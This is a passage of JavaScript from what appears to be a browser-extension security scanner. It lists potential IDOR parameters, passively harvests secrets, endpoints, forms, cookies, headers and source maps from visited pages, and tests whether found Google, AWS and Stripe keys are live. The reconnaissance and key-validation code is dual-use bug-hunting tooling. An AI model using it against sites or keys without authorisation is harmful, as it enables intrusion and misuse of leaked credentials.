  b.innerHTML = '<div class="text-xs text-muted mb-4">Page: ' + esc(activeTabUrl) + '</div><div class="text-sm mb-6">' + findings.length + ' potential IDOR parameters</div>' +
    findings.map(f => '<div class="result-item ' + (f.priority === 'high' ? 'high' : 'medium') + '" style="cursor:pointer"><div class="result-label"><span class="result-tag tag-' + (f.priority === 'high' ? 'high' : 'medium') + '">' + esc(f.type) + '</span> ' + esc(f.source) + '</div><div class="result-value">' + esc(f.param) + ' = ' + esc(f.value) + '</div>' + (f.url ? '<div class="text-xs text-muted">' + esc(f.url).slice(0, 100) + '</div>' : '') + '<div class="text-xs mt-4" style="color:var(--warning)">Try: ' + f.suggest.map(s => '<code style="background:var(--surface-hover);padding:1px 4px;border-radius:2px">' + esc(s) + '</code>').join(' ') + '</div>' + (f.predictability ? '<div class="text-xs text-muted mt-4">\ud83d\udcca ' + esc(f.predictability) + '</div>' : '') + '</div>').join('');
  finalizeResults('discovery');
}

// ═══ LIVE BROWSE ═══
function setupLiveBrowse() {
  const btn = document.getElementById('btn-live-toggle');
  btn?.addEventListener('click', () => {
    if (liveActive) {
      liveActive = false;
      btn.textContent = 'Start Monitoring';
      btn.classList.remove('success'); btn.classList.add('primary');
      log('Live Browse stopped', 'warn');
    } else {
      liveActive = true;
      liveTargetDomain = activeTabDomain;
      document.getElementById('live-target').textContent = 'Target: ' + liveTargetDomain + ' (+ subdomains)';
      btn.textContent = '■ Stop';
      btn.classList.remove('primary'); btn.classList.add('success');
      document.querySelector('[data-group="live"]')?.classList.add('open');
      log('Live Browse started on ' + liveTargetDomain, 'success');
      // Initial scan of current page
      liveScanPage(activeTabId, activeTabUrl, '');
    }
  });
  document.getElementById('btn-live-copy')?.addEventListener('click', () => {
    const lines = liveFindings.map(f => `[${f.time}] [${f.type}] ${f.url}\n  ${f.items.map(i => '  ' + i).join('\n  ')}`);
    copyText(`CYBOWARE LIVE BROWSE REPORT\nTarget: ${liveTargetDomain}\n${'─'.repeat(40)}\n\n${lines.join('\n\n')}`);
  });
  document.getElementById('btn-live-json')?.addEventListener('click', () => {
    copyText(JSON.stringify({ target: liveTargetDomain, findings: liveFindings }, null, 2));
  });
  document.getElementById('btn-live-clear')?.addEventListener('click', () => {
    liveFindings = []; liveSeenItems.clear();
    document.getElementById('live-feed').innerHTML = '<div class="text-muted text-sm" style="padding:12px;text-align:center">Cleared</div>';
    document.getElementById('live-count').textContent = '0 findings';
    const badge = document.getElementById('badge-live'); badge.textContent = '0'; badge.classList.add('hidden');
  });
}

// Debounced live scan — prevents triple-firing from tab update + SPA + DOM mutation
function debouncedLiveScan(tabId, url, title) {
  const now = Date.now();
  // Skip if same URL scanned within last 2 seconds
  if (url === liveScanLastUrl && now - liveScanLastTime < 2000) return;
  clearTimeout(liveScanTimer);
  liveScanTimer = setTimeout(() => {
    liveScanLastUrl = url;
    liveScanLastTime = Date.now();
    liveScanPage(tabId, url, title || '');
  }, 500);
}

async function liveScanPage(tabId, url, title) {
  const feed = document.getElementById('live-feed');
  const ts = new Date().toLocaleTimeString();
  const pathname = new URL(url).pathname;
  const entry = { time: ts, url, type: 'scan', items: [] };

  // Scanning indicator
  const scanDiv = document.createElement('div');
  scanDiv.style.cssText = 'padding:6px 10px;border-bottom:1px solid var(--border);font-size:10.5px;';
  scanDiv.innerHTML = `<div style="display:flex;justify-content:space-between"><span class="text-mono" style="color:var(--accent)">${esc(ts)}</span><span class="text-xs text-muted">${esc(pathname)}</span></div><div class="loading-text" style="padding:4px 0"><span class="spinner"></span> Scanning…</div>`;
  if (feed.firstChild?.classList?.contains('text-muted')) feed.innerHTML = '';
  feed.prepend(scanDiv);

  const newItems = [];
  let cachedScripts = null;
  try {
    // 1. Get scripts once, reuse for secrets + endpoints
    try {
      cachedScripts = await chrome.tabs.sendMessage(tabId, { type: 'GET_SCRIPT_URLS' });
    } catch {}

    // 1. Secrets
    try {
      if (cachedScripts?.ok) {
        const findings = [];
        for (const jsUrl of cachedScripts.data.external.slice(0, 10)) {
          try { const r = await chrome.runtime.sendMessage({ type: 'FETCH_JS', url: jsUrl }); if (r.ok) scanSecrets(r.text, jsUrl, findings); } catch {}
        }
        cachedScripts.data.inline.slice(0, 5).forEach((txt, i) => scanSecrets(txt, '[inline]', findings));
        findings.forEach(f => {
          const key = 'secret:' + f.match;
          if (!liveSeenItems.has(key)) { liveSeenItems.add(key); newItems.push({ type: 'secrets', icon: '🔑', text: `[${f.severity}] ${f.name}: ${f.match.slice(0, 60)}` }); }
        });
      }
    } catch {}

    // 2. Endpoints (reuse cachedScripts)
    try {
      if (cachedScripts?.ok) {
        const eps = new Set();
        const proc = t => { for (const p of ENDPOINT_PATTERNS) { const re = new RegExp(p.source, p.flags); let m; while ((m = re.exec(t)) !== null) { const ep = m[1] || m[0]; if (isRealEndpoint(ep)) eps.add(ep); } } };
        for (const u of cachedScripts.data.external.slice(0, 8)) { try { const r = await chrome.runtime.sendMessage({ type: 'FETCH_JS', url: u }); if (r.ok) proc(r.text); } catch {} }
        cachedScripts.data.inline.forEach(proc);
        eps.forEach(ep => {
          const key = 'ep:' + ep;
          if (!liveSeenItems.has(key)) { liveSeenItems.add(key); newItems.push({ type: 'endpoints', icon: '🔗', text: ep }); }
        });
      }
    } catch {}

    // 2b. Runtime API endpoints from captured XHR/fetch
    try {
      const reqRes = await chrome.runtime.sendMessage({ type: 'GET_CAPTURED_REQUESTS', tabId });
      (reqRes.requests || []).slice(-30).forEach(req => {
        if (!req.url) return;
        try {
          const ru = new URL(req.url);
          if (/\.(css|js|png|jpg|gif|svg|woff|ico|map|webp)(\?|$)/i.test(ru.pathname)) return;
          if (/google-analytics|googletagmanager|facebook\.com|doubleclick|clarity\.ms/i.test(req.url)) return;
          const ep = ru.pathname + (ru.search || '');
          const key = 'ep:' + ep;
          if (!liveSeenItems.has(key) && ep.length > 3) { liveSeenItems.add(key); newItems.push({ type: 'endpoints', icon: '🔗', text: (req.method || 'GET') + ' ' + ep }); }
        } catch {}
      });
    } catch {}

    // 3. Passive vulns
    try {
      const vr = await chrome.tabs.sendMessage(tabId, { type: 'CHECK_PASSIVE_VULNS' });
      (vr?.data || []).forEach(v => {
        const key = 'vuln:' + v.type + ':' + v.detail;
        if (!liveSeenItems.has(key)) { liveSeenItems.add(key); newItems.push({ type: 'vulns', icon: '⚡', text: `[${v.severity}] ${v.type}: ${v.detail}` }); }
      });
    } catch {}

    // 4. Forms (login, upload, admin)
    try {
      const fr = await chrome.tabs.sendMessage(tabId, { type: 'EXTRACT_FORMS' });
      (fr?.data || []).forEach(f => {
        const hasPassword = f.fields.some(fi => fi.type === 'password');
        const hasFile = f.fields.some(fi => fi.type === 'file');
        const key = 'form:' + (f.action || pathname);
        if (!liveSeenItems.has(key)) {
          liveSeenItems.add(key);
          const label = hasPassword ? 'Login form' : hasFile ? 'File upload' : `Form (${f.fields.length} fields)`;
          newItems.push({ type: 'forms', icon: '📝', text: `${label} → ${f.method?.toUpperCase()||'GET'} ${f.action||'(self)'}` });
        }
      });
    } catch {}

    // 5. New cookies
    try {
      const cr = await chrome.runtime.sendMessage({ type: 'GET_COOKIES', domain: new URL(url).hostname });
      (cr?.cookies || []).forEach(c => {
        const key = 'cookie:' + c.name;
        if (!liveSeenItems.has(key)) {
          liveSeenItems.add(key);
          const flags = [];
          if (!c.httpOnly) flags.push('!HttpOnly');
          if (!c.secure) flags.push('!Secure');
          if (c.sameSite === 'unspecified') flags.push('!SameSite');
          if (flags.length) newItems.push({ type: 'cookies', icon: '🍪', text: `${c.name} — ${flags.join(', ')}` });
        }
      });
    } catch {}

    // 6. URL params (potential injection points)
    try {
      const u = new URL(url);
      u.searchParams.forEach((v, k) => {
        const key = 'param:' + k;
        if (!liveSeenItems.has(key)) { liveSeenItems.add(key); newItems.push({ type: 'params', icon: '🎯', text: `URL param: ${k}=${v.slice(0, 40)}` }); }
      });
    } catch {}

    // 7. Interesting headers
    try {
      const hRes = await chrome.runtime.sendMessage({ type: 'GET_HEADERS', tabId });
      (hRes.headers?.responseHeaders || []).forEach(h => {
        const n = h.name.toLowerCase();
        if (['server','x-powered-by','x-debug','x-debug-token','x-aspnet-version','x-runtime'].includes(n)) {
          const key = 'hdr:' + n + ':' + h.value;
          if (!liveSeenItems.has(key)) { liveSeenItems.add(key); newItems.push({ type: 'headers', icon: '📋', text: `${h.name}: ${h.value}` }); }
        }
      });
    } catch {}

    // 8. Source maps (.js.map files)
    try {
      if (cachedScripts?.ok) {
        for (const jsUrl of cachedScripts.data.external.slice(0, 5)) {
          const mapUrl = jsUrl + '.map';
          const key = 'srcmap:' + mapUrl;
          if (!liveSeenItems.has(key)) {
            try {
              const r = await chrome.runtime.sendMessage({ type: 'FETCH_URL', url: mapUrl, method: 'HEAD' });
              if (r.ok && r.status === 200) { liveSeenItems.add(key); newItems.push({ type: 'srcmap', icon: '🗺', text: `Source map exposed: ${mapUrl.split('/').pop()}` }); }
              else { liveSeenItems.add(key); }
            } catch { liveSeenItems.add(key); }
          }
        }
      }
    } catch {}

  } catch (e) { log('Live scan error: ' + e.message, 'error'); }

  // Only show if we have NEW findings
  entry.items = newItems.map(i => `${i.icon} ${i.text}`);
  if (newItems.length === 0) {
    scanDiv.innerHTML = `<div style="display:flex;justify-content:space-between"><span class="text-mono" style="color:var(--text-tertiary)">${esc(ts)}</span><span class="text-xs text-muted">${esc(pathname)} — nothing new</span></div>`;
  } else {
    let html = `<div style="display:flex;justify-content:space-between;margin-bottom:4px"><span class="text-mono" style="color:var(--accent)">${esc(ts)}</span><span class="text-xs" style="color:var(--accent);font-weight:600">${newItems.length} new · ${esc(pathname)}</span></div>`;
    newItems.forEach(item => {
      const color = item.type === 'secrets' ? 'var(--danger)' : item.type === 'vulns' ? 'var(--warning)' : 'var(--text-secondary)';
      html += `<div style="padding:2px 0;font-size:10px;font-family:var(--font-mono);color:${color}">${item.icon} ${esc(item.text)}</div>`;
    });
    scanDiv.innerHTML = html;
  }

  liveFindings.push(entry);
  const totalItems = liveFindings.reduce((s, f) => s + f.items.length, 0);
  document.getElementById('live-count').textContent = totalItems + ' findings, ' + liveSeenItems.size + ' unique';
  if (totalItems > 0) { const badge = document.getElementById('badge-live'); badge.textContent = totalItems; badge.classList.remove('hidden'); }
}

// ═══ KEY VALIDATION ═══
window.testGoogleKey = async function(key) {
  log('Testing Google API key…');
  try {
    const r = await chrome.runtime.sendMessage({ type: 'TEST_GOOGLE_KEY', key });
    if (r.ok) {
      if (r.status === 'OK' || r.status === 'ZERO_RESULTS') {
        log('Google API key is ACTIVE and unrestricted!', 'warn');
        alert('KEY IS LIVE!\n\nThis Google API key is active and unrestricted.\nThis is a confirmed vulnerability — report it.');
      } else {
        log('Google key restricted or invalid: ' + r.status, 'success');
        alert('Key status: ' + r.status + '\n' + (r.error_message || ''));
      }
    } else { log('Key test failed: ' + r.error, 'error'); }
  } catch (e) { log('Key test failed: ' + e.message, 'error'); }
};

window.testAwsKey = async function(key) {
  log('Testing AWS key…');
  try {
    const r = await chrome.runtime.sendMessage({ type: 'TEST_AWS_KEY', key });
    if (r.ok) {
      if (r.valid) {
        log('AWS key appears ACTIVE!', 'warn');
        alert('AWS KEY MAY BE LIVE!\n\nThe key returned a non-403 response from STS.\nManual verification recommended with aws-cli.');
      } else {
        log('AWS key returned ' + r.status + ' — likely invalid or restricted', 'success');
        alert('AWS key status: HTTP ' + r.status + '\nLikely invalid or restricted.');
      }
    } else { log('AWS test failed: ' + r.error, 'error'); }
  } catch (e) { log('AWS test failed: ' + e.message, 'error'); }
};

window.testStripeKey = async function(key) {
  log('Testing Stripe key…');
  try {
    const r = await chrome.runtime.sendMessage({ type: 'TEST_STRIPE_KEY', key });
    if (r.ok) {
      if (r.valid) {
        log('Stripe key is ACTIVE!', 'warn');
        alert('STRIPE KEY IS LIVE!\n\nThis secret key is active and can access the Stripe API.\nThis is a confirmed vulnerability — report it.');
      } else {
        log('Stripe key returned ' + r.status + ' — invalid or restricted', 'success');
        alert('Stripe key status: HTTP ' + r.status + '\nInvalid or restricted.');
      }
    } else { log('Stripe test failed: ' + r.error, 'error'); }
  } catch (e) { log('Stripe test failed: ' + e.message, 'error'); }
};

// ═══ HELPERS ═══
function esc(s){if(!s)return'';const d=document.createElement('div');d.textContent=String(s);return d.innerHTML}
function errMsg(e){return`<div class="result-item high"><div class="result-value">${esc(typeof e==='string'?e:e?.message||'Unknown error')}</div></div>`}
function getRootDomain(h){if(!h)return'';const p=h.split('.');if(p.length<=2)return h;const multiTLDs=['co.uk','co.jp','co.kr','co.nz','co.za','co.in','co.id','co.il','com.au','com.br','com.cn','com.mx','com.sg','com.tr','com.tw','com.hk','org.uk','org.au','net.au','ac.uk','gov.uk','gov.au','edu.au','ne.jp','or.jp','ac.jp','go.jp'];const last2=p.slice(-2).join('.');if(multiTLDs.includes(last2)&&p.length>2)return p.slice(-3).join('.');return p.slice(-2).join('.')}
function copyText(t){navigator.clipboard.writeText(t).then(()=>{const e=document.getElementById('copy-toast');e.classList.add('show');setTimeout(()=>e.classList.remove('show'),1200)}).catch(()=>log('Copy failed','error'))}
function downloadText(t,f){const b=new Blob([t],{type:'text/plain'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=f;a.click();URL.revokeObjectURL(u)}
function log(msg,level='info'){const el=document.getElementById('debug-log-entries');const e=document.createElement('div');e.className='log-entry '+(level||'');e.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`;el.appendChild(e);el.scrollTop=el.scrollHeight;while(el.children.length>100)el.removeChild(el.firstChild)}
